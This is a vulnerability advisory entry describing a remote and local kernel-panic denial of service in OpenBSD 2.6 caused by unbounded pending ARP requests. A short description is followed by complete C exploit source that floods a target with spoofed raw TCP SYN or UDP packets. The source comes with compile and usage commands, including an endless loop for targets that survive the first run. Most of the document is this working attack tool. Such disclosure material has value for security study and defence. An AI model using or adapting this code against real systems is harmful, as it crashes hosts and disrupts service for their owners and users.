source: http://www.securityfocus.com/bid/1759/info

OpenBSD is vulnerable to a remotely exploitable denial of service condition. The problem seems to be a lack of limits on the storage of pending arp requests, and a failure to handle the condition of too many. If an attacker somehow causes a victim machine to send out too many arp requests, it can cause a kernel panic and the target system to halt.

If an OpenBSD machine is on a network with a large address space (much more than a class C) an attacker can send it spoofed packets with addresses of hosts within its network. The victim host would then send out arp requests to find the MAC address for each host. If a sufficient number of arp requests are sent out, the kernel will panic with the message:

"out of space in kmem_map"

and freeze. 

/*
 * [local/remote] kernel-panic DoS against openBSD 2.6
 * 20000802, anonymous@segfault.net
 *
 * works on local lan or any host which can be reached through
 * gateways with rp_filter = 0 [default on most linux routers and most other
 * OS'es. take a look at /proc/sys/net/ipv4/conf/default/rp_filter].
 *
 * panic: malloc: out of space in kmem_map,
 * Stopped at: _debugger+0x4:   ieave
 *
 * this is nothing special. The kernel runs out of memory
 * and panics.
 *
 * ./obsd_fun <target ip> <network> <count>
 * target_ip is the ...wtf..you know what it is.
 * network is the beginning of the network of the target_ip.
 * count is the number of hosts we spoof from. 
 *
 * How does it work ?:
 * While coding some scanning tool i saw that linux was unable
 * to handle 1000 arp-request/sec [arp-table overflow].
 * I thought obsd could be able to handle 1k arp-request/sec..but
 * i was wrong. 
 *
 * First DoS was a local one. All I did was sent
 * packets to thousend of hosts on the same network.
 * [it doesnt matter if the hosts exist or not]
 * The Obsd kernel paniced after a few seconds.
 * I leave it as an exercise for the reader to reengineer the local DoS.
 * [addon after a 'bratwurscht'-break: i took the exercise myself.]
 *
 * Remote DoS:
 * We send thousends of spoofed packets to the target machiene.
 * The target machiene tries to answer these packets [with
 * a tcp-syn, tcp-rst ,icmp-port-unreachable or whatever].
 *
 * For that it needs the mac-address of the origin host. 
 * If this host does not exist the Obsd box will never get
 * an answer and w8 for the arp-reply until it timesout.
 * Thats it. We simply overflow the arp-table/memory.
 *
 * I use tcp-packets in this example. It also works with udp or icmp.
 *
 * How to use it?:
 * gcc -Wall -o obsd_fun obsd_fun.c
 * If the host-ip is 10.23.13.37 on a 10.23/16 network:
 * leetbox:~# ./obsd_fun 10.23.13.37 10.23.0.1 65534
 *
 * A count of 20.000 works fine here. But my box only has 64 MB ram.
 * If this doesnt work try bigger values.
 * If this still does not work...try an endless loop:
 * while :; do ./obsd_fun 10.23.13.37 10.23.0.1 65534 ; done
 * [sound crazy..but it works. I was unable to DoS a obsd 2.6 on
 * a /16-network with 128 MB ram and a count of 65334...but after
 * 6-loops the box paniced]
 *
 * Local DoS:
 * Works like the remote one. But we use udp this time:
 * myfirstobsd:~$ ./obsd_fun 10.23.0.1 32000
 * works fine on my 64 MB obsd 2.6 box.
 *
 *
 * Oh..i forgott something:
 * Basicly i dont like DoS-attacks or really lame (d)dos attacks.
 * It SUCKs. Thats really not what hacking is about.
 *
 * Greetings: yum. this is a DoS. to lame for greetings.
 *
 * 
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __BSD_SOURCE
#define __BSD_SOURCE
#endif
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define ETH_SIZE        14
#define IP_SIZE         20
#define TCP_SIZE        20

#define int_ntoa(x)   inet_ntoa(*((struct in_addr *)&(x)))

/*
 *  Checksum stuff
 */
#define CKSUM_CARRY(x) \
    (x = (x >> 16) + (x & 0xffff), (~(x + (x >> 16)) & 0xffff))

/*
 * leet net tuple
 */
struct net_tuple
{
  uint32_t src;
  unsigned short int sport;
  uint32_t dst;
  unsigned short int dport;
};

/*
 * pseudo TCP header for calculating the chksum
 */
struct _fakehead {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t  zero;
    uint8_t protocol;
    uint16_t tot_len;
};

unsigned char packet[128];

/* 
 * calc. checksum WITH carry flag.
 * call cksum = CKSUM_CARRY(in_cksum(blah));
 */
int
in_cksum(unsigned short *addr, int len)
{
   int                  nleft = len;
   int                  sum = 0;
   u_short              *w = addr;
   u_short              answer = 0;
   
   while (nleft > 1)
   {
      sum += *w++;
      nleft -= 2;
   }
   
   if (nleft == 1)      /* padding */
   {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
   }
   
  return(sum);
}


void
add_tcphdr(unsigned char *pkt, struct net_tuple *nt, uint8_t flags)
{
   struct tcphdr                tcp;
   struct _fakehead             fakehead;
   int sum;

   memset(&tcp, 0, sizeof(tcp));
   memset(&fakehead, 0, sizeof(fakehead));

   tcp.th_dport = nt->dport;
   tcp.th_sport = nt->sport;
   fakehead.saddr = nt->src;
 fakehead.daddr = nt->dst;
   fakehead.zero = 0,
   fakehead.protocol = 6;
   fakehead.tot_len = htons(TCP_SIZE);
   sum = in_cksum((u_short *)&fakehead, sizeof(fakehead));
   tcp.th_off = TCP_SIZE >> 2;
   tcp.th_seq = 31337;                         /* ###fixme */
   tcp.th_flags |= flags;                      /* ADD the flags */
   tcp.th_win = htons(0x3fff);
   sum += in_cksum((u_short *)&tcp, sizeof(tcp));
   tcp.th_sum = CKSUM_CARRY(sum);
   memcpy(pkt, &tcp, sizeof(tcp));
}



/*
 * add's ipv4-header of 20 bytes without any options
 * - IPPROTO_TCP and 40 bytes total length
 */
void
add_iphdr(unsigned char *pkt, struct net_tuple *nt)
{
  struct ip                     ip;

  memset(&ip, 0, 20); 
  ip.ip_hl = sizeof(ip) >> 2;
  ip.ip_v = 4;
  /*ip->tos = 0;*/
  ip.ip_len = htons(IP_SIZE + TCP_SIZE);  /* htons ? */
  /*ip->id = 0;                  done by kernel */
  /*ip->frag_off = 0;*/
  ip.ip_ttl = 0xff;
  ip.ip_p = IPPROTO_TCP;        
  /*.ip->check = 0;      done by kernel */
  ip.ip_src.s_addr = nt->src;
  ip.ip_dst.s_addr = nt->dst;
  memcpy(pkt, &ip, sizeof(ip));
}


/*
 * send out ipv4-packet
 * with data 'pkt' of length 'len'
 * returns the number of characters sent, or -1 if an error occured
 */
int
send_ipv4(int sox, u_char  *pkt, size_t len)
{
   struct sockaddr_in   to;

   to.sin_family = AF_INET;
   memcpy(&to.sin_addr.s_addr, (pkt + 4*4), sizeof(u_long));

   return(sendto(sox, pkt, len, 0 , (struct sockaddr *)&to, sizeof(to)) );
}

/*
 * for a local DoS.
 * we use udp this time [much easier, much faster, but only local:)]
 */
void
local_dos(char *argv[])
{
  struct sockaddr_in saddr;
  int c=0;
  int sox;
  int iprunner;

  if( (sox = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
  {
     fprintf(stderr, "error creating socket\n");
     exit(1);
  }

  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(31337);
  iprunner = ntohl(inet_addr(argv[1]));

  while (c++< atoi(argv[2]))
  {
    saddr.sin_addr.s_addr = htonl(iprunner++);
    sendto(sox, NULL, 0, 0, (struct sockaddr *)&saddr, sizeof(saddr));
  }

  printf("not working ?! wtf ! mailme asap anonymous@segfault.net\n");
  exit(0);

}


void
usage(int code)
{
  printf("\n4local  DoS:\n");
  printf("obsd_fun <network> <count>\n");
  printf("    obsd_fun 10.23.0.1 32000\n\n");
  printf("4 remote DoS:\n");
  printf("obsd_fun <target_ip> <network> <count>\n");
  printf("    obsd_fun 10.23.13.37 10.23.0.1 65000\n\n");
  exit(code);
}

int
main(int argc, char *argv[])
{
  struct net_tuple nt;
  int sox;
  int on = 1;
  unsigned long iprunner;
  int c=0;

  if (argc < 3)
     usage(0);
  if (argc == 3)
     local_dos(argv);

  memset(&nt, 0, sizeof(nt));

  if( (sox = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
  {
     fprintf(stderr, "error creating socket\n");
     exit(1);
  }
  if (setsockopt(sox, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
  {
     fprintf(stderr, "error setsockopt\n");
     exit(1);
  }

  printf("nuking %s on network %s with %d ip's\n",
                                         argv[1], argv[2], atoi(argv[3]));

  nt.dport = htons(31337);
  nt.sport = htons(31338);
  if ( (nt.dst = inet_addr(argv[1])) == -1)
  {
    fprintf(stderr, "nah. use IP insteat of hostname.\n");
    exit(0);
  }
  iprunner = ntohl(inet_addr(argv[2]));
  memset(packet, 0 , sizeof(packet));

  while (c++< atoi(argv[3]))
  {
    nt.src = htonl(iprunner++);
    add_tcphdr(packet + ETH_SIZE + IP_SIZE, &nt, TH_SYN);
    add_iphdr(packet + ETH_SIZE, &nt);
    send_ipv4(sox, packet + ETH_SIZE, IP_SIZE + TCP_SIZE);
  }

 printf("done. Try an endless loop if box is still alive.\n");
 return(0);
} 